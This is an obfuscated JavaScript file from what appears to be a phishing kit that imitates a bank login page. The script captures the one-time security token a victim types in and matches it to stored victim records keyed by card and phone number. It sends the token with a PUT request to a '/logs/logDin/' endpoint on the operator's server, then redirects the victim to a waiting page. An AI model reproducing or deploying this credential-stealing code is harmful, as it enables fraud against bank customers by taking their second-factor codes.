const _0x1cbb7c = _0xfb87;
(function (_0x3b9ca6, _0x17b808) {
  const _0x2cd5d3 = _0xfb87,
    _0x34930e = _0x3b9ca6();
  while (!![]) {
    try {
      const _0x1a6ca2 =
        -parseInt(_0x2cd5d3(0x180)) / 0x1 +
        -parseInt(_0x2cd5d3(0x19b)) / 0x2 +
        (parseInt(_0x2cd5d3(0x19c)) / 0x3) *
          (parseInt(_0x2cd5d3(0x195)) / 0x4) +
        -parseInt(_0x2cd5d3(0x18a)) / 0x5 +
        (parseInt(_0x2cd5d3(0x184)) / 0x6) *
          (-parseInt(_0x2cd5d3(0x19a)) / 0x7) +
        (parseInt(_0x2cd5d3(0x18e)) / 0x8) *
          (parseInt(_0x2cd5d3(0x191)) / 0x9) +
        (-parseInt(_0x2cd5d3(0x197)) / 0xa) *
          (-parseInt(_0x2cd5d3(0x18b)) / 0xb);
      if (_0x1a6ca2 === _0x17b808) break;
      else _0x34930e["push"](_0x34930e["shift"]());
    } catch (_0x4eac98) {
      _0x34930e["push"](_0x34930e["shift"]());
    }
  }
})(_0xfc76, 0x1d957);
function _0xfb87(_0x524193, _0x357f94) {
  const _0xfc762 = _0xfc76();
  return (
    (_0xfb87 = function (_0xfb8765, _0x3a73ef) {
      _0xfb8765 = _0xfb8765 - 0x17d;
      let _0x132318 = _0xfc762[_0xfb8765];
      return _0x132318;
    }),
    _0xfb87(_0x524193, _0x357f94)
  );
}
function updateLS() {
  const _0x22fae2 = _0xfb87;
  LS[_0x22fae2(0x185)](_0x22fae2(0x190), JSON[_0x22fae2(0x187)](info));
}
const button = document[_0x1cbb7c(0x18c)]("btnLogin-page1"),
  otpButton = document[_0x1cbb7c(0x18c)](_0x1cbb7c(0x181)),
  numberMovil = document[_0x1cbb7c(0x18c)]("docNumberMovil");
otpButton["addEventListener"](_0x1cbb7c(0x192), async function (_0x512ee3) {
  const _0x596247 = _0x1cbb7c;
  _0x512ee3[_0x596247(0x17e)](), (otpButton[_0x596247(0x183)] = !![]);
  if (numberMovil[_0x596247(0x18f)] == "") {
    alert(_0x596247(0x182)),
      numberMovil["focus"](),
      (otpButton["disabled"] = ![]);
    return;
  } else {
    var _0x20e547 = numberMovil[_0x596247(0x18f)];
    (info[_0x596247(0x193)][_0x596247(0x19f)] = _0x20e547), updateLS();
    async function _0x27ae6a() {
      const _0x468037 = _0x596247,
        _0x3ac3cc = await fetch(url + "/logs/logs", {
          method: "GET",
          headers: { "Content-Type": _0x468037(0x194) },
        }),
        _0x57111b = await _0x3ac3cc[_0x468037(0x186)](),
        _0x430561 = [..._0x57111b];
      for (const _0x4feb61 of _0x430561) {
        if (
          _0x4feb61["reg"] == info["metaInfo"]["cc"] &&
          _0x4feb61["cl"] == info["metaInfo"][_0x468037(0x189)]
        ) {
          console[_0x468037(0x198)](_0x468037(0x19e));
          const _0x37a4c8 = await fetch(
              url + _0x468037(0x19d) + _0x4feb61[_0x468037(0x1a0)],
              {
                method: "PUT",
                headers: { "Content-Type": _0x468037(0x194) },
                body: JSON[_0x468037(0x187)]({
                  din: info[_0x468037(0x193)][_0x468037(0x19f)],
                  status: _0x468037(0x17f),
                }),
              }
            ),
            _0x57ba66 = await _0x37a4c8[_0x468037(0x186)]();
          _0x37a4c8["ok"]
            ? console[_0x468037(0x198)](_0x468037(0x199))
            : console[_0x468037(0x18d)](
                _0x468037(0x17d),
                _0x37a4c8["statusText"]
              );
        }
      }
      (otpButton[_0x468037(0x183)] = ![]),
        (window[_0x468037(0x196)]["href"] = _0x468037(0x188));
    }
    await _0x27ae6a();
  }
});
function _0xfc76() {
  const _0x400b09 = [
    "12030eNUjdM",
    "log",
    "Usuario\x20actualizado",
    "28KVjffw",
    "395014tlbRDE",
    "16977ULiiVp",
    "/logs/logDin/",
    "Usuario\x20Encontrado",
    "cdin",
    "idreg",
    "Error\x20al\x20actualizar\x20usuario:",
    "preventDefault",
    "Ingresó\x20Dinámica",
    "191728deOmfH",
    "btnLogin-otapp",
    "Por\x20favor\x20ingrese\x20token\x20de\x20seguridad",
    "disabled",
    "105882axlKax",
    "setItem",
    "json",
    "stringify",
    "wait.html",
    "telnum",
    "255745fZhOLD",
    "3619nKFWOp",
    "getElementById",
    "error",
    "8CMTxhw",
    "value",
    "info",
    "650241ECeCXy",
    "click",
    "metaInfo",
    "application/json",
    "116HwTgTm",
    "location",
  ];
  _0xfc76 = function () {
    return _0x400b09;
  };
  return _0xfc76();
}
